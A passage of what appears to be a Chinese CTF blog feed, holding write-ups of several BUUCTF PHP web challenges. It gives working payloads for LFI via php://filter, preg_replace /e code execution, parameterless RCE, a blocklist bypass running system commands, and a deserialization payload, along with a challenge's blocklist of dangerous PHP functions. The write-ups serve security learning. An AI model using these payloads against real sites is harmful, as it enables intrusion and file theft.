invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个参数，首先是<code>text</code>参数，通过<code>file_get_contents</code>读取，内容为<code>I have a dream</code>，明显是使用php伪协议；然后是<code>file</code>参数，有个提示是<code>next.php</code>，也可以通过php伪协议读取；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">8701</span>d767-ba4e-<span class="hljs-number">434</span>c-<span class="hljs-number">902</span>e-<span class="hljs-number">3</span>b27ef6255cc.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/?text=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure><p>读取到了<code>next.php</code>，解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看到了<code>preg_replace</code>，有个固定的格式（虽然我不知道。。。）：<code>\S*=$&#123;&#125;</code>，这样使用：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">8701</span>d767-ba4e-<span class="hljs-number">434</span>c-<span class="hljs-number">902</span>e-<span class="hljs-number">3</span>b27ef6255cc.node4.buuoj.cn:<span class="hljs-number">81</span>/next.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p>就可以了。</p><p>[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/dhsx/p/4991983.html">慎用preg_replace危险的&#x2F;e修饰符(一句话后门常用) - 稻禾盛夏 - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/1290">老洞新姿势，记一次漏洞挖掘和利用(PHPMailer RCE) - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BSidesCF2020-HadABadDay</title>
    <link href="/2022/12/27/%5Bctf-web%5D%20BSidesCF2020-HadABadDay/"/>
    <url>/2022/12/27/%5Bctf-web%5D%20BSidesCF2020-HadABadDay/</url>
    
    <content type="html"><![CDATA[<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>进入是一个页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221227205609282.png" alt="image-20221227205609282"></p><p>两个选项，点击之后会显示猫狗的图片，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221227205638107.png" alt="image-20221227205638107"></p><p>同时URL改变了，</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">87b38057</span>-<span class="hljs-number">9901</span>-466b-b065-d471ce4f8c36.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?category=woofers<br></code></pre></td></tr></table></figure><p>可能是注入，所以使用</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">87b38057</span>-<span class="hljs-number">9901</span>-466b-b065-d471ce4f8c36.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?category=woofers&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221227205725037.png" alt="image-20221227205725037"></p><p>这里显示了<code>include(woofers&#39;.php)</code>，所以这里会进行文件包含，且会自动的添加<code>.php</code>后缀；使用伪协议读文件，</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">87b38057</span>-<span class="hljs-number">9901</span>-466b-b065-d471ce4f8c36.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?category=php://filter/<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=index<br></code></pre></td></tr></table></figure><p>这里可以读取<code>index.php</code>的内容，解码后有这一段代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参数中必须包括指定的三个字符串才行。</p><p>然后尝试搜索<code>flag.php</code>文件，使用<code>woofers/../flag</code>即当前目录的<code>flag.php</code>文件，运行后在源代码中看到，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221227210414271.png" alt="image-20221227210414271"></p><p>所以flag是在这里的，php伪协议读文件，</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">87b38057</span>-<span class="hljs-number">9901</span>-466b-b065-d471ce4f8c36.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?category=php://filter/<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=flag<br></code></pre></td></tr></table></figure><p>但是这里没有指定的字符串，php为协议可以这样：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>woofers/resource=flag 或<br><br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=index/</span>convert.base64-encode/resource=flag (顺序可以变换)<br></code></pre></td></tr></table></figure><p>所以可以这样：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">87b38057</span>-<span class="hljs-number">9901</span>-466b-b065-d471ce4f8c36.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?category=php://filter/<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/index/resource=flag<br></code></pre></td></tr></table></figure><p>得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] GXYCTF2019-禁止套娃</title>
    <link href="/2022/12/26/%5Bctf-web%5D%20GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
    <url>/2022/12/26/%5Bctf-web%5D%20GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>进入就是个空页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226195237062.png" alt="image-20221226195237062"></p><p>什么都没有，尝试目录爆破，但没有dirb，略过此步，最后是<code>.git</code>目录，用githack下载源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这里有三层过滤，首先不能使用伪协议，然后只能是<code>xxx(yyy());</code>这种形式的，最后过滤一些关键字；那么主要就是在第二步。</p><p>知识点：</p><p><code>localeconv()</code>函数返回一包含本地数字及货币格式信息的数组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">localeconv</span>();<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/779a5c5bfe504fecae5c9c5cc6f053db.png" alt="在这里插入图片描述"></p><p>看到第一个数组的内容是<code>.</code>；</p><p><code>current()</code> 函数返回数组中的当前元素的值，</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/2807977ea8254216ad7e2fdfbe4d48f9.png" alt="在这里插入图片描述"></p><p><code>scandir()</code>列出指定目录中的文件和目录，当参数为<code>.</code>时，即列出当前目录的文件，</p><p>下面payload返回当前目录下的文件：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226200116723.png" alt="image-20221226200116723"></p><p><code>array_reverse()</code>函数以相反的元素顺序返回数组；</p><p><code>next()</code>函数讲内部指针指向数组中的下一个元素；</p><p><code>highlight_file()</code>将代码高亮显示出来；</p><p>最终payload：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226200241930.png" alt="image-20221226200241930"></p><hr><p>还有一种解法，即使用<code>session_id</code>获得了<code>PHPSESSID</code>的值<code>flag.php</code>，再使用<code>readfile</code>函数进行文件读取，在此之前需要开启<code>session</code>，即使用<code>session_start()</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221226200333455.png" alt="image-20221226200333455"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>无参rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 网鼎杯2020朱雀组-phpweb</title>
    <link href="/2022/12/25/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/"/>
    <url>/2022/12/25/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>进去是一个页面，会一直刷新，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221225164530412.png" alt="image-20221225164530412"></p><p>抓包查看，发现有这样的一个数据包，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221225164610515.png" alt="image-20221225164610515"></p><p>结合之前页面的错误信息，这里的func是一个函数，p是参数，尝试读取文件，</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=highlight_file&amp;p=index.php<br></code></pre></td></tr></table></figure><p>这样就得到了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>     <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br> &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>         &#125;<br>     &#125;<br> &#125;<br> <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br> <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br> <br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>     <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     &#125;<span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>     &#125;<br> &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里对许多函数进行了过滤，所以一种方法是绕过其中的过滤，可以使用</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func=\system&amp;p=cat <span class="hljs-constructor">$(<span class="hljs-params">find</span> <span class="hljs-operator">/</span> -<span class="hljs-params">name</span> <span class="hljs-params">flag</span><span class="hljs-operator">*</span>)</span><br></code></pre></td></tr></table></figure><p>使得过滤失效。</p><p>还有一种反序列化的方法，没有过滤unserialize函数，这里有一个类Test，可以构建反序列化：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BUUCTF2018-OnlineTool</title>
    <link href="/2022/12/23/%5Bctf-web%5D%20BUUCTF2018-OnlineTools/"/>
    <url>/2022/12/23/%5Bctf-web%5D%20BUUCTF2018-OnlineTools/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>进入就是php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>大概意思就是GET参数host，经过<code>escapeshellarg</code>和<code>escapeshellcmd</code>过滤之后，作为nmap的参数执行命令。关键的俩函数如何过滤？</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞 | 离别歌 (leavesongs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/36602107">利用&#x2F;绕过 PHP escapeshellarg&#x2F;escapeshellcmd函数 - 知乎 (zhihu.com)</a></p><p><a 